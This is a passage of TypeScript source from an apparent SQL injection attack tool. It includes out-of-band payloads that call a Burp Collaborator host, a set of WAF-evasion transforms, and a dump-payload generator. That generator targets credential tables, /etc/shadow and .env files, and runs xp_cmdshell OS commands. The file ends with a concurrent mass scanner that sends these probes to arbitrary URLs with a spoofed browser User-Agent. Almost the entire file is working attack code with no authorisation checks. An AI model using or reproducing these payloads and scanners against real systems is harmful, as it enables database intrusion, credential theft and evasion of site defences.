  P(`'; exec master..xp_fileexist '//sqlitest.burpcollaborator.net/a'-- -`,
    'oob', 'none', 'MSSQL', 'MSSQL DNS via xp_fileexist'),
  P(`' UNION SELECT UTL_HTTP.REQUEST('http://sqlitest.burpcollaborator.net') FROM dual-- -`,
    'oob', 'none', 'Oracle', 'Oracle UTL_HTTP OOB'),

  // ════════════════════════════════════════════════════════════════════════════
  // SECOND-ORDER markers
  // ════════════════════════════════════════════════════════════════════════════
  P(`1' OR '1'='1' /*`,             'error', 'none', 'Any', 'Second-order marker 1'),
  P(`admin'--`,                     'error', 'none', 'Any', 'Second-order admin bypass marker'),
  P(`' OR 1=1--\x00`,              'boolean', 'null_byte', 'Any', 'Null-terminated second order'),
];

// ── WAF Bypass transforms ──────────────────────────────────────────────────────
export interface WafBypassVariant {
  name: string;
  description: string;
  transform: (payload: string) => string;
}

export const WAF_BYPASSES: WafBypassVariant[] = [
  {
    name: 'None (Raw)',
    description: 'No bypass — raw payload',
    transform: p => p,
  },
  {
    name: 'URL Encode',
    description: "URL-encode special chars (%27, %20, %22)",
    transform: p => p.replace(/'/g, '%27').replace(/ /g, '%20').replace(/"/g, '%22').replace(/=/g, '%3D').replace(/;/g, '%3B'),
  },
  {
    name: 'Double URL Encode',
    description: 'Double-encode (%2527, %2520)',
    transform: p => p.replace(/'/g, '%2527').replace(/ /g, '%2520').replace(/=/g, '%253D'),
  },
  {
    name: 'Case Variation',
    description: 'Alternate upper/lower to evade keyword matching',
    transform: p => p.replace(/\b(select|union|from|where|and|or|insert|drop|sleep|waitfor|delay|order|group|having|null|cast|convert|exec|execute|declare)\b/gi,
      w => w.split('').map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join('')),
  },
  {
    name: 'Comment Padding',
    description: 'Insert /**/ between keywords',
    transform: p => p.replace(/\b(SELECT|UNION|FROM|WHERE|AND|OR|SLEEP|WAITFOR|DELAY|INSERT|DROP|NULL|CAST|CONVERT|EXEC|DECLARE)\b/gi, '/**/\$&/**/'),
  },
  {
    name: 'Inline Comments',
    description: 'MySQL /*!keyword*/ versioned comment bypass',
    transform: p => p.replace(/\b(SELECT|UNION|FROM|WHERE|AND|OR|SLEEP|WAITFOR|CAST|CONVERT)\b/gi, '/*!$&*/'),
  },
  {
    name: 'Newline Encode',
    description: 'Replace spaces with %0a (newline)',
    transform: p => p.replace(/ /g, '%0a'),
  },
  {
    name: 'Tab Encode',
    description: 'Replace spaces with %09 (tab)',
    transform: p => p.replace(/ /g, '%09'),
  },
  {
    name: 'Carriage Return Encode',
    description: 'Replace spaces with %0d (carriage return)',
    transform: p => p.replace(/ /g, '%0d'),
  },
  {
    name: 'Plus Space',
    description: 'Replace spaces with +',
    transform: p => p.replace(/ /g, '+'),
  },
  {
    name: 'Hex Encode Values',
    description: 'Encode numeric literals as hex (1 → 0x31)',
    transform: p => p.replace(/\b(\d+)\b/g, n => '0x' + parseInt(n).toString(16)),
  },
  {
    name: 'Null Byte',
    description: 'Insert %00 null byte before keywords',
    transform: p => p.replace(/\b(SELECT|UNION|FROM|WHERE)\b/gi, '%00$&'),
  },
  {
    name: 'Versioned Comment (MySQL)',
    description: '/*!50000keyword*/ MySQL-specific versioned comments',
    transform: p => p.replace(/\b(SELECT|UNION|FROM|WHERE|AND|OR|SLEEP)\b/gi, '/*!50000$&*/'),
  },
  {
    name: 'Mixed Newline+Tab',
    description: 'Alternate newline and tab as whitespace',
    transform: p => p.replace(/ /g, (_, i) => i % 2 === 0 ? '%0a' : '%09'),
  },
  {
    name: 'String Concat (MySQL)',
    description: "Split strings using CONCAT: 'admin' → CONCAT('adm','in')",
    transform: p => p.replace(/'([a-zA-Z]{3,})'/g, (_, w) => `CONCAT('${w.slice(0, Math.ceil(w.length/2))}','${w.slice(Math.ceil(w.length/2))}')`),
  },
  {
    name: 'String Concat (MSSQL)',
    description: "Split strings using MSSQL concatenation: 'admin' → 'adm'+'in'",
    transform: p => p.replace(/'([a-zA-Z]{3,})'/g, (_, w) => `'${w.slice(0, Math.ceil(w.length/2))}'+'${w.slice(Math.ceil(w.length/2))}'`),
  },
  {
    name: 'String Concat (Oracle)',
    description: "Split strings using Oracle ||: 'admin' → 'adm'||'in'",
    transform: p => p.replace(/'([a-zA-Z]{3,})'/g, (_, w) => `'${w.slice(0, Math.ceil(w.length/2))}'||'${w.slice(Math.ceil(w.length/2))}'`),
  },
  {
    name: 'Scientific Notation',
    description: 'Use 1e0 instead of 1, 0e0 instead of 0 (MySQL/MariaDB)',
    transform: p => p.replace(/\b1\b/g, '1e0').replace(/\b0\b/g, '0e0'),
  },
  {
    name: 'Keyword Splitting (/**/ inside)',
    description: "SE/**/LECT instead of SELECT — breaks most pattern matchers",
    transform: p => p.replace(/\b(SELECT|UNION|WHERE|FROM|AND|OR|SLEEP)\b/gi, w => {
      const mid = Math.ceil(w.length / 2);
      return `${w.slice(0, mid)}/**/${w.slice(mid)}`;
    }),
  },
  {
    name: 'Unicode Encode',
    description: "URL-encode quotes as %u0027 (IIS Unicode bypass)",
    transform: p => p.replace(/'/g, '%u0027').replace(/ /g, '%u0020'),
  },
  {
    name: 'HTML Entity Encode',
    description: "HTML entity quote: &#x27; or &#39;",
    transform: p => p.replace(/'/g, '&#x27;').replace(/ /g, '&#x20;'),
  },
  {
    name: 'Buffer Overflow Comment',
    description: 'Prepend 2000-char comment to overflow WAF pattern buffer',
    transform: p => `/*${'A'.repeat(2000)}*/${p}`,
  },
];

// ── Database dump payload generator ───────────────────────────────────────────
export interface DumpTarget {
  label: string;
  description: string;
}

export const DUMP_TARGETS: Record<string, DumpTarget> = {
  current_user:      { label: 'DB User & Privileges',  description: 'Get current DB user, version, hostname' },
  list_databases:    { label: 'List All Databases',    description: 'Enumerate all databases on the server' },
  list_tables:       { label: 'List All Tables',       description: 'List all tables in the current database' },
  list_columns:      { label: 'List Columns',          description: 'List columns for a specific table' },
  users_table:       { label: 'User/Login Table',      description: 'Dump common user/credential tables' },
  extract_data:      { label: 'Extract Table Data',    description: 'Extract all rows from a specific table' },
  read_file:         { label: 'Read System Files',     description: 'MySQL FILE privilege — read /etc/passwd etc.' },
  os_commands:       { label: 'OS Command Output',     description: 'MSSQL xp_cmdshell / MySQL INTO OUTFILE' },
  env_variables:     { label: 'Environment Variables', description: 'Read system env: /proc/self/environ, sys env' },
  running_queries:   { label: 'Running Queries',       description: 'MySQL processlist / PgSQL pg_stat_activity' },
  linked_servers:    { label: 'Linked Servers',        description: 'MSSQL linked server enumeration' },
  privileges:        { label: 'User Privileges',       description: 'Enumerate database user privileges/grants' },
};

export interface DumpPayload {
  target: string;
  dbType: DbType;
  columnCount: number;
  columnPosition: number;
  payload: string;
  description: string;
  urlEncoded: string;
  notes: string;
}

export function generateDumpPayloads(
  paramName: string,
  baseUrl: string,
  dbType: DbType,
  columnCount: number,
  dumpTarget: string,
  wafBypassName: string,
  customTable = 'users',
  customColumn = 'username,password',
): DumpPayload[] {
  const nulls = (n: number, replace: number, val: string) =>
    Array.from({ length: n }, (_, i) => (i + 1 === replace ? val : 'NULL')).join(',');

  const bypass = WAF_BYPASSES.find(b => b.name === wafBypassName) ?? WAF_BYPASSES[0];
  const col = Math.max(1, Math.min(columnCount, 3));

  const buildUrl = (payload: string): string => {
    try {
      const u = new URL(baseUrl);
      u.searchParams.set(paramName, payload);
      return u.toString();
    } catch { return `${baseUrl}?${paramName}=${encodeURIComponent(payload)}`; }
  };

  const queries: Array<{ payload: string; desc: string; notes: string }> = [];

  if (dumpTarget === 'current_user') {
    const q: Record<DbType | 'Unknown', string[]> = {
      MySQL:      [`' UNION SELECT ${nulls(columnCount, col, 'CONCAT(user(),0x7c,version(),0x7c,database(),0x7c,@@hostname,0x7c,@@datadir)')}-- -`],
      PostgreSQL: [`' UNION SELECT ${nulls(columnCount, col, "current_user||'|'||version()||'|'||current_database()||'|'||inet_server_addr()")}-- -`],
      MSSQL:      [`' UNION SELECT ${nulls(columnCount, col, "SYSTEM_USER+'|'+@@version+'|'+DB_NAME()+'|'+@@SERVERNAME")}-- -`],
      Oracle:     [`' UNION SELECT ${nulls(columnCount, col, "user||'|'||sys.database_name")} FROM dual-- -`],
      SQLite:     [`' UNION SELECT ${nulls(columnCount, col, "sqlite_version()||'|'||sqlite_source_id()")}-- -`],
      Unknown:    [`' UNION SELECT ${nulls(columnCount, col, 'version()')}-- -`],
    };
    (q[dbType] ?? q.Unknown).forEach(p => queries.push({ payload: p, desc: 'Current DB user + version + DB name + hostname', notes: '0x7c = "|" hex separator' }));
  }

  if (dumpTarget === 'list_databases') {
    const q: Record<DbType | 'Unknown', string[]> = {
      MySQL:      [
        `' UNION SELECT ${nulls(columnCount, col, 'GROUP_CONCAT(schema_name ORDER BY schema_name SEPARATOR 0x7c)')} FROM information_schema.schemata-- -`,
        `' UNION SELECT ${nulls(columnCount, col, 'schema_name')} FROM information_schema.schemata LIMIT 0,1-- -`,
        `' UNION SELECT ${nulls(columnCount, col, 'schema_name')} FROM information_schema.schemata LIMIT 1,1-- -`,
      ],
      PostgreSQL: [
        `' UNION SELECT ${nulls(columnCount, col, "string_agg(datname,'|')")} FROM pg_database-- -`,
        `' UNION SELECT ${nulls(columnCount, col, 'datname')} FROM pg_database LIMIT 1-- -`,
      ],
      MSSQL:      [
        `' UNION SELECT ${nulls(columnCount, col, 'name')} FROM master..sysdatabases-- -`,
        `' UNION SELECT ${nulls(columnCount, col, 'STRING_AGG(name,0x7c)')} FROM master..sysdatabases-- -`,
      ],
      Oracle:     [`' UNION SELECT ${nulls(columnCount, col, 'owner')} FROM all_tables WHERE ROWNUM=1-- -`],
      SQLite:     [`' UNION SELECT ${nulls(columnCount, col, "tbl_name")} FROM sqlite_master WHERE type='table' LIMIT 1-- -`],
      Unknown:    [`' UNION SELECT ${nulls(columnCount, col, 'schema_name')} FROM information_schema.schemata-- -`],
    };
    (q[dbType] ?? q.Unknown).forEach(p => queries.push({ payload: p, desc: 'Enumerate all databases', notes: 'Increment LIMIT offset to page' }));
  }

  if (dumpTarget === 'list_tables') {
    const q: Record<DbType | 'Unknown', string[]> = {
      MySQL:      [
        `' UNION SELECT ${nulls(columnCount, col, 'GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR 0x7c)')} FROM information_schema.tables WHERE table_schema=database()-- -`,
        `' UNION SELECT ${nulls(columnCount, col, 'table_name')} FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1-- -`,
      ],
      PostgreSQL: [
        `' UNION SELECT ${nulls(columnCount, col, "string_agg(tablename,'|')")} FROM pg_tables WHERE schemaname='public'-- -`,
        `' UNION SELECT ${nulls(columnCount, col, 'tablename')} FROM pg_tables WHERE schemaname='public' LIMIT 1-- -`,
      ],
      MSSQL:      [
        `' UNION SELECT ${nulls(columnCount, col, 'table_name')} FROM information_schema.tables-- -`,
        `' UNION SELECT ${nulls(columnCount, col, 'STRING_AGG(table_name,0x7c)')} FROM information_schema.tables-- -`,
      ],
      Oracle:     [`' UNION SELECT ${nulls(columnCount, col, 'table_name')} FROM all_tables WHERE ROWNUM<=10-- -`],
      SQLite:     [`' UNION SELECT ${nulls(columnCount, col, "GROUP_CONCAT(tbl_name,'|')")} FROM sqlite_master WHERE type='table'-- -`],
      Unknown:    [`' UNION SELECT ${nulls(columnCount, col, 'table_name')} FROM information_schema.tables WHERE table_schema=database()-- -`],
    };
    (q[dbType] ?? q.Unknown).forEach(p => queries.push({ payload: p, desc: 'List all tables in current DB', notes: 'Pipe-separated list' }));
  }

  if (dumpTarget === 'list_columns') {
    const tbl = customTable;
    const q: Record<DbType | 'Unknown', string[]> = {
      MySQL:      [`' UNION SELECT ${nulls(columnCount, col, `GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR 0x7c)`)} FROM information_schema.columns WHERE table_name='${tbl}'-- -`],
      PostgreSQL: [`' UNION SELECT ${nulls(columnCount, col, `string_agg(column_name,'|')`)} FROM information_schema.columns WHERE table_name='${tbl}'-- -`],
      MSSQL:      [`' UNION SELECT ${nulls(columnCount, col, `STRING_AGG(column_name,0x7c)`)} FROM information_schema.columns WHERE table_name='${tbl}'-- -`],
      Oracle:     [`' UNION SELECT ${nulls(columnCount, col, `LISTAGG(column_name,0x7c) WITHIN GROUP (ORDER BY column_id)`)} FROM all_tab_columns WHERE table_name=UPPER('${tbl}')-- -`],
      SQLite:     [`' UNION SELECT ${nulls(columnCount, col, `GROUP_CONCAT(name,'|')`)} FROM pragma_table_info('${tbl}')-- -`],
      Unknown:    [`' UNION SELECT ${nulls(columnCount, col, `column_name`)} FROM information_schema.columns WHERE table_name='${tbl}'-- -`],
    };
    (q[dbType] ?? q.Unknown).forEach(p => queries.push({ payload: p, desc: `List columns of "${tbl}"`, notes: 'Pipe-separated column names' }));
  }

  if (dumpTarget === 'users_table') {
    const commonTables = ['users', 'accounts', 'admin', 'members', 'customers', 'staff', 'logins', 'credentials'];
    const q: Record<DbType | 'Unknown', string[]> = {
      MySQL:      commonTables.map(tbl => `' UNION SELECT ${nulls(columnCount, col, `GROUP_CONCAT(username,0x3a,password SEPARATOR 0x7c)`)} FROM ${tbl} LIMIT 20-- -`),
      PostgreSQL: commonTables.map(tbl => `' UNION SELECT ${nulls(columnCount, col, `string_agg(username||':'||password,'|')`)} FROM ${tbl} LIMIT 20-- -`),
      MSSQL:      commonTables.map(tbl => `' UNION SELECT TOP 20 ${nulls(columnCount, col, `username+':'+password`)} FROM ${tbl}-- -`),
      Oracle:     commonTables.map(tbl => `' UNION SELECT ${nulls(columnCount, col, `LISTAGG(username||':'||password,0x7c) WITHIN GROUP (ORDER BY username)`)} FROM ${tbl} WHERE ROWNUM<=20-- -`),
      SQLite:     commonTables.map(tbl => `' UNION SELECT ${nulls(columnCount, col, `GROUP_CONCAT(username||':'||password,'|')`)} FROM ${tbl} LIMIT 20-- -`),
      Unknown:    commonTables.map(tbl => `' UNION SELECT ${nulls(columnCount, col, `username`)} FROM ${tbl}-- -`),
    };
    (q[dbType] ?? q.Unknown).slice(0, 5).forEach((p, i) => queries.push({ payload: p, desc: `Dump credentials from "${commonTables[i]}"`, notes: 'username:password pairs' }));
  }

  if (dumpTarget === 'extract_data') {
    const cols = customColumn.split(',').map(c => c.trim()).filter(Boolean);
    const selectCols = cols.length > 1
      ? `CONCAT(${cols.map((c, i) => i > 0 ? `0x7c,${c}` : c).join(',')})`
      : cols[0] ?? 'id';
    [
      { payload: `' UNION SELECT ${nulls(columnCount, col, `GROUP_CONCAT(${selectCols} SEPARATOR 0x0a)`)} FROM ${customTable} LIMIT 20-- -`, desc: `Dump ${customColumn} from "${customTable}" (rows 1–20)`, notes: '0x0a = newline row separator' },
      { payload: `' UNION SELECT ${nulls(columnCount, col, `${selectCols}`)} FROM ${customTable} LIMIT 0,1-- -`, desc: 'Dump first row', notes: 'Increment LIMIT first param' },
      { payload: `' UNION SELECT ${nulls(columnCount, col, `${selectCols}`)} FROM ${customTable} LIMIT 1,1-- -`, desc: 'Dump second row', notes: 'Increment to page rows' },
      { payload: `' UNION SELECT ${nulls(columnCount, col, `COUNT(*)`)} FROM ${customTable}-- -`, desc: `Row count of "${customTable}"`, notes: 'Know how many rows to extract' },
    ].forEach(q => queries.push(q));
  }

  if (dumpTarget === 'read_file') {
    const files = ['/etc/passwd', '/etc/shadow', '/etc/mysql/my.cnf', '/var/www/html/config.php',
                   '/var/www/html/.env', 'C:/Windows/win.ini', 'C:/boot.ini', '/proc/self/environ',
                   '/proc/version', '/proc/self/cmdline'];
    files.forEach(f => queries.push({
      payload: `' UNION SELECT ${nulls(columnCount, col, `LOAD_FILE('${f}')`)}-- -`,
      desc: `Read file: ${f}`,
      notes: "Requires MySQL FILE privilege and secure_file_priv=''",
    }));
  }

  if (dumpTarget === 'os_commands') {
    queries.push(
      { payload: `'; EXEC xp_cmdshell('whoami')-- -`, desc: 'MSSQL: whoami', notes: 'Requires xp_cmdshell enabled' },
      { payload: `'; EXEC xp_cmdshell('ipconfig')-- -`, desc: 'MSSQL: ipconfig', notes: 'Windows network info' },
      { payload: `'; EXEC xp_cmdshell('net user')-- -`, desc: 'MSSQL: list users', notes: 'Windows user enumeration' },
      { payload: `' UNION SELECT ${nulls(columnCount, col, "'whoami'")} INTO OUTFILE '/tmp/out.txt'-- -`, desc: 'MySQL: INTO OUTFILE test', notes: 'Requires FILE priv + writable path' },
      { payload: `'; EXEC master..xp_dirtree 'C:\\',1,1-- -`, desc: 'MSSQL: list drive C', notes: 'xp_dirtree filesystem walk' },
    );
  }

  if (dumpTarget === 'env_variables') {
    queries.push(
      { payload: `' UNION SELECT ${nulls(columnCount, col, "LOAD_FILE('/proc/self/environ')")}-- -`, desc: 'MySQL: /proc/self/environ', notes: 'Reads process environment' },
      { payload: `' UNION SELECT ${nulls(columnCount, col, '@@global.secure_file_priv')}-- -`, desc: 'MySQL: secure_file_priv setting', notes: 'Check file read/write constraints' },
      { payload: `' UNION SELECT ${nulls(columnCount, col, '@@global.datadir')}-- -`, desc: 'MySQL: data directory path', notes: 'Know where DB files are stored' },
      { payload: `' UNION SELECT ${nulls(columnCount, col, 'current_setting(\'data_directory\')')}-- -`, desc: 'PgSQL: data_directory', notes: 'PgSQL configuration setting' },
    );
  }

  if (dumpTarget === 'running_queries') {
    queries.push(
      { payload: `' UNION SELECT ${nulls(columnCount, col, 'GROUP_CONCAT(info,0x7c,user,0x7c,db)')} FROM information_schema.processlist-- -`, desc: 'MySQL: running queries', notes: 'Reveals other active queries' },
      { payload: `' UNION SELECT ${nulls(columnCount, col, "string_agg(query,'|')")} FROM pg_stat_activity-- -`, desc: 'PgSQL: active queries', notes: 'pg_stat_activity view' },
      { payload: `' UNION SELECT ${nulls(columnCount, col, 'text')} FROM sys.dm_exec_sql_text(0)-- -`, desc: 'MSSQL: SQL text', notes: 'Dynamic management view' },
    );
  }

  if (dumpTarget === 'linked_servers') {
    queries.push(
      { payload: `' UNION SELECT ${nulls(columnCount, col, 'name')} FROM sys.servers-- -`, desc: 'MSSQL: linked servers', notes: 'Lateral movement targets' },
      { payload: `'; EXEC sp_linkedservers-- -`, desc: 'MSSQL: sp_linkedservers', notes: 'Stored proc for linked server list' },
    );
  }

  if (dumpTarget === 'privileges') {
    queries.push(
      { payload: `' UNION SELECT ${nulls(columnCount, col, 'GROUP_CONCAT(GRANTEE,0x7c,PRIVILEGE_TYPE,0x7c,IS_GRANTABLE)')} FROM information_schema.user_privileges-- -`, desc: 'MySQL: user privileges', notes: 'All grants for all users' },
      { payload: `' UNION SELECT ${nulls(columnCount, col, 'GROUP_CONCAT(user,0x7c,select_priv,0x7c,file_priv,0x7c,super_priv)')} FROM mysql.user-- -`, desc: 'MySQL: mysql.user table', notes: 'Requires SELECT on mysql.user' },
      { payload: `' UNION SELECT ${nulls(columnCount, col, "grantee||'|'||privilege_type")} FROM information_schema.role_table_grants LIMIT 10-- -`, desc: 'PgSQL: role grants', notes: 'Table-level privileges' },
    );
  }

  return queries.map(({ payload, desc, notes }) => {
    const bypassed = bypass.transform(payload);
    return {
      target: dumpTarget,
      dbType,
      columnCount,
      columnPosition: col,
      payload: bypassed,
      description: desc,
      urlEncoded: buildUrl(bypassed),
      notes,
    };
  });
}

// ── Scanner ────────────────────────────────────────────────────────────────────
export interface SqliHit {
  probe: SqliProbe;
  technique: string;
  dbType: DbType;
  evidence: string;
  responseTime: number;
  baselineTime: number;
  isTimeBased: boolean;
  severity: 'critical' | 'high' | 'medium' | 'low';
  columnCount?: number;
  wafDetected: boolean;
}

export interface SqliParamResult {
  param: string;
  originalValue: string;
  vulnerable: boolean;
  severity: string;
  dbType: DbType;
  techniques: string[];
  hits: SqliHit[];
  columnCount: number | null;
  totalTested: number;
  wafDetected: boolean;
}

export interface SqliUrlResult {
  url: string;
  vulnerable: boolean;
  params: SqliParamResult[];
  error?: string;
  duration: number;
}

const WAF_SIGNATURES = [
  /forbidden/i, /blocked by/i, /security check/i, /cloudflare ray/i, /sucuri/i,
  /mod_security/i, /access denied/i, /invalid request/i, /request rejected/i,
  /web application firewall/i, /your request has been blocked/i,
  /not acceptable/i, /bad request/i, /firewall/i, /incapsula/i, /akamai/i,
  /f5 big-ip/i, /imperva/i, /barracuda/i, /attack detected/i,
];

function detectWaf(html: string, statusCode: number): boolean {
  if ([403, 406, 429, 501, 503].includes(statusCode)) return true;
  return WAF_SIGNATURES.some(p => p.test(html));
}

export async function withConcurrency<T>(tasks: (() => Promise<T>)[], limit: number): Promise<T[]> {
  const results: T[] = new Array(tasks.length);
  let idx = 0;
  async function worker() { while (idx < tasks.length) { const i = idx++; results[i] = await tasks[i](); } }
  await Promise.all(Array.from({ length: Math.min(limit, tasks.length) }, worker));
  return results;
}

async function fetchWithTiming(
  url: string,
  timeoutMs = 10000,
  extraHeaders: Record<string, string> = {}
): Promise<{ html: string; status: number; time: number }> {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), timeoutMs);
  const start = Date.now();
  try {
    const resp = await fetch(url, {
      signal: ctrl.signal,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        ...extraHeaders,
      },
      redirect: 'follow',
    });
    clearTimeout(t);
    const html = await resp.text();
    return { html, status: resp.status, time: Date.now() - start };
  } catch {
    clearTimeout(t);
    return { html: '', status: 0, time: Date.now() - start };
  }
}

// Detect column count from UNION response by looking for reflected markers
function extractColumnCount(html: string, probePayload: string): number | null {
  if (!html.includes('ALCAME')) return null;
  const m = probePayload.match(/SELECT\s+([\d,\s]+|NULL(?:,NULL)*)/i);
  if (!m) return null;
  const parts = m[1].split(',');
  return parts.length;
}

export async function scanSqlParam(
  baseUrl: URL,
  paramName: string,
  originalValue: string,
  onHit?: (hit: SqliHit) => void,
  fastMode = false,
  progressCallback?: (done: number, total: number) => void,
): Promise<SqliParamResult> {
  // Get multiple baselines for better accuracy
  const [bl1, bl2] = await Promise.all([
    fetchWithTiming(baseUrl.toString()),
    fetchWithTiming(baseUrl.toString()),
  ]);
  const baselineLength = Math.round((bl1.html.length + bl2.html.length) / 2);
  const baselineTime = Math.round((bl1.time + bl2.time) / 2);

  const probes = fastMode ? SQLI_PROBES.filter(p => p.fast) : SQLI_PROBES;
  const hits: SqliHit[] = [];
  let wafDetected = false;
  let dbType: DbType = 'Unknown';
  let columnCount: number | null = null;
  const techniques = new Set<string>();
  let doneCount = 0;

  // ── Smart ordering: error → boolean → union → stacked → time ──────────────
  const ordered = [
    ...probes.filter(p => p.technique === 'error'),
    ...probes.filter(p => p.technique === 'boolean'),
    ...probes.filter(p => p.technique === 'union'),
    ...probes.filter(p => p.technique === 'stacked'),
    ...probes.filter(p => p.technique === 'time'),
    ...probes.filter(p => p.technique === 'oob'),
  ];

  const tasks = ordered.map(probe => async (): Promise<void> => {
    doneCount++;
    progressCallback?.(doneCount, ordered.length);

    const testUrl = new URL(baseUrl.toString());
    testUrl.searchParams.set(paramName, probe.payload);

    const timeout = probe.technique === 'time' ? 12000 : 8000;
    const resp = await fetchWithTiming(testUrl.toString(), timeout);

    if (detectWaf(resp.html, resp.status)) wafDetected = true;

    // ── Error-based ────────────────────────────────────────────────────────
    const errResult = detectSqlError(resp.html);
    if (errResult.found) {
      if (errResult.dbType !== 'Unknown') dbType = errResult.dbType;
      const hit: SqliHit = {
        probe, technique: 'Error-Based', dbType: errResult.dbType,
        evidence: errResult.evidence, responseTime: resp.time, baselineTime,
        isTimeBased: false, severity: 'critical',
        wafDetected: detectWaf(resp.html, resp.status),
      };
      hits.push(hit);
      techniques.add('Error-Based');
      onHit?.(hit);
      return;
    }

    // ── Time-based ─────────────────────────────────────────────────────────
    if (probe.technique === 'time') {
      // Must be significantly slower than baseline (baseline + 3.5s threshold)
      const delta = resp.time - baselineTime;
      if (delta >= 3500) {
        const db = probe.dbHint === 'Any' ? 'Unknown' : probe.dbHint as DbType;
        const hit: SqliHit = {
          probe, technique: 'Time-Based Blind', dbType: db,
          evidence: `Response: ${resp.time}ms, Baseline: ${baselineTime}ms, Δ = ${delta}ms`,
          responseTime: resp.time, baselineTime, isTimeBased: true, severity: 'critical',
          wafDetected: detectWaf(resp.html, resp.status),
        };
        hits.push(hit);
        techniques.add('Time-Based Blind');
        if (db !== 'Unknown') dbType = db;
        onHit?.(hit);
      }
      return;
    }

    // ── UNION-based: look for hex marker 0x414c43414d45 = "ALCAME" ─────────
    if (probe.technique === 'union' && resp.html.includes('ALCAME')) {
      const cols = extractColumnCount(resp.html, probe.payload);
      if (cols) columnCount = cols;
      const db = detectDbType(resp.html);
      if (db !== 'Unknown') dbType = db;
      const hit: SqliHit = {
        probe, technique: 'UNION-Based', dbType: db !== 'Unknown' ? db : 'Unknown',
        evidence: `UNION marker "ALCAME" reflected in response (columns: ${columnCount ?? 'unknown'})`,
        responseTime: resp.time, baselineTime, isTimeBased: false, severity: 'critical',
        columnCount: columnCount ?? undefined,
        wafDetected: detectWaf(resp.html, resp.status),
      };
      hits.push(hit);
      techniques.add('UNION-Based');
      onHit?.(hit);
      return;
    }

    // ── Boolean-based: content-length differential ─────────────────────────
    if (probe.technique === 'boolean') {
      const lengthDiff = Math.abs(resp.html.length - baselineLength);
      const pctDiff = baselineLength > 0 ? lengthDiff / baselineLength : 0;
      // Require meaningful diff: >300 chars or >15% change, and not just empty response
      if (resp.html.length > 100 && (lengthDiff > 300 || pctDiff > 0.15)) {
        const hit: SqliHit = {
          probe, technique: 'Boolean-Based Blind', dbType: 'Unknown',
          evidence: `Length: ${resp.html.length} vs baseline: ${baselineLength} (Δ${resp.html.length - baselineLength}, ${(pctDiff * 100).toFixed(1)}%)`,
          responseTime: resp.time, baselineTime, isTimeBased: false, severity: 'high',
          wafDetected: detectWaf(resp.html, resp.status),
        };
        hits.push(hit);
        techniques.add('Boolean-Based Blind');
        onHit?.(hit);
      }
    }
  });

  // Run with concurrency: error+boolean+union fast, time slow
  await withConcurrency(tasks, 8);

  // Resolve best severity
  const sevRank: Record<string, number> = { low: 1, medium: 2, high: 3, critical: 4 };
  const worstSev = hits.reduce((best, h) =>
    (sevRank[h.severity] ?? 0) > (sevRank[best] ?? 0) ? h.severity : best, 'low');

  if (dbType === 'Unknown' && hits.length > 0) {
    const dbHit = hits.find(h => h.dbType !== 'Unknown');
    if (dbHit) dbType = dbHit.dbType;
  }

  return {
    param: paramName,
    originalValue,
    vulnerable: hits.length > 0,
    severity: hits.length > 0 ? worstSev : 'none',
    dbType,
    techniques: [...techniques],
    hits,
    columnCount,
    totalTested: ordered.length,
    wafDetected,
  };
}

// ── Mass bulk scanner ──────────────────────────────────────────────────────────
export interface BulkSqliEvent {
  type: 'bulk_start' | 'url_start' | 'param_hit' | 'url_done' | 'bulk_done' | 'url_error';
  url?: string;
  urlIndex?: number;
  totalUrls?: number;
  param?: string;
  technique?: string;
  dbType?: string;
  severity?: string;
  evidence?: string;
  payload?: string;
  vulnerable?: boolean;
  paramResults?: Omit<SqliParamResult, 'hits'>[];
  totalHits?: number;
  vulnUrls?: number;
  duration?: number;
  error?: string;
  wafDetected?: boolean;
}

export async function scanSqlBulk(
  urls: string[],
  concurrency: number,
  fastMode: boolean,
  onEvent: (e: BulkSqliEvent) => void,
  signal?: AbortSignal,
): Promise<void> {
  const startTime = Date.now();
  let vulnUrls = 0;
  let totalHits = 0;

  onEvent({ type: 'bulk_start', totalUrls: urls.length });

  const tasks = urls.map((rawUrl, urlIndex) => async (): Promise<void> => {
    if (signal?.aborted) return;

    let parsedUrl: URL;
    try {
      parsedUrl = new URL(rawUrl.trim());
    } catch {
      onEvent({ type: 'url_error', url: rawUrl, urlIndex, totalUrls: urls.length, error: 'Invalid URL format' });
      return;
    }

    const params = [...parsedUrl.searchParams.entries()];
    if (params.length === 0) {
      onEvent({ type: 'url_error', url: rawUrl, urlIndex, totalUrls: urls.length, error: 'No query parameters found' });
      return;
    }

    onEvent({ type: 'url_start', url: rawUrl, urlIndex, totalUrls: urls.length });

    const urlStart = Date.now();
    const paramResults: SqliParamResult[] = [];
    let urlVuln = false;

    for (const [paramName, originalValue] of params) {
      if (signal?.aborted) break;

      try {
        const result = await scanSqlParam(
          parsedUrl,
          paramName,
          originalValue,
          (hit) => {
            totalHits++;
            onEvent({
              type: 'param_hit',
              url: rawUrl,
              urlIndex,
              param: paramName,
              technique: hit.technique,
              dbType: hit.dbType,
              severity: hit.severity,
              evidence: hit.evidence.slice(0, 300),
              payload: hit.probe.payload,
              wafDetected: hit.wafDetected,
            });
          },
          fastMode,
        );

        paramResults.push(result);
        if (result.vulnerable) urlVuln = true;
      } catch {
        // Skip param on error
      }
    }

    if (urlVuln) vulnUrls++;

    onEvent({
      type: 'url_done',
      url: rawUrl,
      urlIndex,
      totalUrls: urls.length,
      vulnerable: urlVuln,
      paramResults: paramResults.map(r => ({
        param: r.param, originalValue: r.originalValue, vulnerable: r.vulnerable,
        severity: r.severity, dbType: r.dbType, techniques: r.techniques,
        hitsCount: r.hits.length, columnCount: r.columnCount,
        totalTested: r.totalTested, wafDetected: r.wafDetected,
      })),
      totalHits: paramResults.reduce((s, r) => s + r.hits.length, 0),
      wafDetected: paramResults.some(r => r.wafDetected),
      duration: Date.now() - urlStart,
    });
  });

  await withConcurrency(tasks, Math.max(1, Math.min(concurrency, 20)));

  onEvent({
    type: 'bulk_done',
    totalUrls: urls.length,
    vulnUrls,
    totalHits,
    duration: Date.now() - startTime,
  });
}
